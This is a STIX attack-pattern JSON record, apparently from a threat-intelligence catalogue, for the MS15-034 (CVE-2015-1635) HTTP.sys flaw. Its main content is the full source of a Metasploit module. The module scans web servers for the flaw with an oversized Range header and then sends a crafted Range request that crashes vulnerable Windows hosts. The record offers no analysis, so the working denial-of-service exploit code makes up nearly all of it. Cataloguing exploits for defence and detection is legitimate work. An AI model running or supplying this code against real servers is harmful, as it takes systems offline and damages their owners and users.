{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5d16b530-fd75-4060-bb26-29437fbf87d5",
    "created": "2024-08-14T16:26:17.806541Z",
    "modified": "2024-08-14T16:26:17.806546Z",
    "name": "MS15-034 HTTP Protocol Stack Request Handling Denial-of-Service",
    "description": "No description available.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/dos/http/ms15_034_ulonglongadd.rb",
            "external_id": "ms15_034_ulonglongadd.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-1635"
        },
        {
            "source_name": "reference",
            "url": "https://pastebin.com/ypURDPc4"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/rapid7/metasploit-framework/pull/5150"
        },
        {
            "source_name": "reference",
            "url": "https://community.qualys.com/blogs/securitylabs/2015/04/20/ms15-034-analyze-and-remote-detection"
        },
        {
            "source_name": "reference",
            "url": "http://www.securitysift.com/an-analysis-of-ms15-034/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n\n  # Watch out, dos all the things\n  include Msf::Auxiliary::Scanner\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Dos\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'MS15-034 HTTP Protocol Stack Request Handling Denial-of-Service',\n      'Description'    => %q{\n        This module will check if scanned hosts are vulnerable to CVE-2015-1635 (MS15-034), a\n        vulnerability in the HTTP protocol stack (HTTP.sys) that could result in arbitrary code\n        execution. This module will try to cause a denial-of-service.\n      },\n      'Author'         =>\n        [\n          # Bill did all the work (see the pastebin code), twitter: @hectorh56193716\n          'Bill Finlayson',\n          # MSF. But really, these people made it happen:\n          # https://github.com/rapid7/metasploit-framework/pull/5150\n          'sinn3r'\n        ],\n      'References'     =>\n        [\n          ['CVE', '2015-1635'],\n          ['MSB', 'MS15-034'],\n          ['URL', 'https://pastebin.com/ypURDPc4'],\n          ['URL', 'https://github.com/rapid7/metasploit-framework/pull/5150'],\n          ['URL', 'https://community.qualys.com/blogs/securitylabs/2015/04/20/ms15-034-analyze-and-remote-detection'],\n          ['URL', 'http://www.securitysift.com/an-analysis-of-ms15-034/']\n        ],\n      'License'        => MSF_LICENSE\n    ))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [false, 'URI to the site (e.g /site/) or a valid file resource (e.g /welcome.png)', '/'])\n      ])\n  end\n\n  def upper_range\n    0xFFFFFFFFFFFFFFFF\n  end\n\n  def run_host(ip)\n    if check_host(ip) == Exploit::CheckCode::Vulnerable\n      dos_host(ip)\n    else\n      print_status(\"Probably not vulnerable, will not dos it.\")\n    end\n  end\n\n  # Needed to allow the vulnerable uri to be shared between the #check and #dos\n  def target_uri\n    @target_uri ||= super\n  end\n\n  def get_file_size(ip)\n    @file_size ||= lambda {\n      file_size = -1\n      uri = normalize_uri(target_uri.path)\n      res = send_request_raw('uri' => uri)\n\n      unless res\n        vprint_error(\"Connection timed out\")\n        return file_size\n      end\n\n      if res.code == 404\n        vprint_error(\"You got a 404. URI must be a valid resource.\")\n        return file_size\n      end\n\n      file_size = res.body.length\n      vprint_status(\"File length: #{file_size} bytes\")\n\n      return file_size\n    }.call\n  end\n\n  def dos_host(ip)\n    file_size = get_file_size(ip)\n    lower_range = file_size - 2\n\n    # In here we have to use Rex because if we dos it, it causes our module to hang too\n    uri = normalize_uri(target_uri.path)\n    begin\n      cli = Rex::Proto::Http::Client.new(ip)\n      cli.connect\n      req = cli.request_raw(\n        'uri' => uri,\n        'method' => 'GET',\n        'headers' => {\n          'Range' => \"bytes=#{lower_range}-#{upper_range}\"\n        }\n      )\n      cli.send_request(req)\n    rescue ::Errno::EPIPE, ::Timeout::Error\n      # Same exceptions the HttpClient mixin catches\n    end\n    print_status(\"DOS request sent\")\n  end\n\n  def potential_static_files_uris\n    uri = normalize_uri(target_uri.path)\n\n    return [uri] unless uri[-1, 1] == '/'\n\n    uris = [\"#{uri}welcome.png\"]\n    res  = send_request_raw('uri' => uri, 'method' => 'GET')\n\n    return uris unless res\n\n    site_uri = URI.parse(full_uri)\n    page     = Nokogiri::HTML(res.body.encode('UTF-8', invalid: :replace, undef: :replace))\n\n    page.xpath('//link|//script|//style|//img').each do |tag|\n      %w(href src).each do |attribute|\n        attr_value = tag[attribute]\n\n        next unless attr_value && !attr_value.empty?\n\n        uri = site_uri.merge(URI::DEFAULT_PARSER.escape(attr_value.strip))\n\n        next unless uri.host == vhost || uri.host == rhost\n\n        uris << uri.path if uri.path =~ /\\.[a-z]{2,}$/i # Only keep path with a file\n      end\n    end\n\n    uris.uniq\n  end\n\n  def check_host(ip)\n    potential_static_files_uris.each do |potential_uri|\n      uri = normalize_uri(potential_uri)\n\n      res = send_request_raw(\n        'uri' => uri,\n        'method' => 'GET',\n        'headers' => {\n          'Range' => \"bytes=0-#{upper_range}\"\n        }\n      )\n\n      vmessage = \"#{peer} - Checking #{uri}\"\n\n      if res && res.body.include?('Requested Range Not Satisfiable')\n        vprint_status(\"#{vmessage} [#{res.code}] - Vulnerable\")\n\n        target_uri.path = uri # Needed for the DoS attack\n\n        return Exploit::CheckCode::Vulnerable\n      elsif res && res.body.include?('The request has an invalid header name')\n        vprint_status(\"#{vmessage} [#{res.code}] - Safe\")\n\n        return Exploit::CheckCode::Safe\n      else\n        vprint_status(\"#{vmessage} - Unknown\")\n      end\n    end\n\n    Exploit::CheckCode::Unknown\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ]
}